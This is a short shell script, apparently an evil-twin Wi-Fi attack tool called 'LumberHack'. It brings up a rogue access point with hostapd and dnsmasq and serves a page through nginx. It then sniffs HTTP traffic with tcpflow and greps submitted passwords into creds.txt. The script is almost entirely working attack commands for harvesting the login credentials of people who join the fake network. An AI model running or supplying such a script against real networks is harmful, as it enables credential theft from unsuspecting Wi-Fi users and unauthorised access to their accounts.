#Starts the AP hosting service
hostapd hostapd.conf &

#Starts the DHCP server
dnsmasq -C dnsmasq.conf -d &

#Assigns gateway ip and netmask to the interface
ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0 &
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 &

#starts nginx service
service nginx start
#service nginx reload
#service nginx restart

# starts tcpflow and greps the passwords from incoming packets. Then outputs this to a an output file
tcpflow -i any -C -g port 80 | grep -i "password1=" --line-buffered >> creds.txt

# Once scraping is done kills processes and stops nginx service
service nginx stop
sleep 5

killall dnsmasq
sleep 5

killall hostapd
sleep 5
echo "LumberHack down credentials output to creds.txt"

